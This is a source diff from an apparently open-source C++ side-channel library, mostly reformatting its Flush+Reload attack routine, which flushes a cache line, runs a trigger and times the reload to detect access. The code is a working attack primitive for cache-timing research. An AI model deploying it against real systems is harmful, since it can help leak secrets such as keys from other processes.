@@ -18,33 +18,35 @@ along with libCacheMoney.  If not, see <http://www.gnu.org/licenses/>.
 
 #include <attacks/flush_reload.hpp>
 #include <intrinsics.hpp>
+#include <l1.hpp>
 #include <utils.hpp>
 
 namespace cache_money {
 
-    flush_reload::flush_reload(uintptr_t address)
-            : m_address(address), m_results() {}
+flush_reload::flush_reload(uintptr_t address)
+    : m_address(address), m_results() {}
 
-    std::vector<uint64_t> flush_reload::get_results() { return m_results; }
+std::vector<uint64_t> flush_reload::get_results() { return m_results; }
 
-    bool flush_reload::attack(uint64_t offset, std::optional<uint64_t> baseline,
-                              std::function<void()> trigger,
-                              std::optional<int64_t> maxIterations) {
-        m_results.clear();
-        int index = 0;
-        if (!baseline.has_value())
-            baseline = utils::get_cache_baseline_speed();
+bool flush_reload::attack(uint64_t offset, std::optional<uint64_t> baseline,
+                          std::function<void()> trigger,
+                          std::optional<int64_t> maxIterations) {
+  m_results.clear();
+  int index = 0;
+  if (!baseline.has_value())
+    baseline = cache::l1::speed();
 
-        while (index < maxIterations || maxIterations == std::nullopt) {
-            intrinsics::clflush(m_address);
-            if (trigger)trigger();
-            auto time = intrinsics::memaccesstime(m_address);
-            m_results.push_back(time);
-            if (time - offset < *baseline) {
-                return true;
-            }
-            index++;
-        }
-        return false;
+  while (index < maxIterations || maxIterations == std::nullopt) {
+    intrinsics::clflush(m_address);
+    if (trigger)
+      trigger();
+    auto time = intrinsics::memaccesstime(m_address);
+    m_results.push_back(time);
+    if (time - offset < *baseline) {
+      return true;
     }
+    index++;
+  }
+  return false;
+}
 } // namespace cache_money
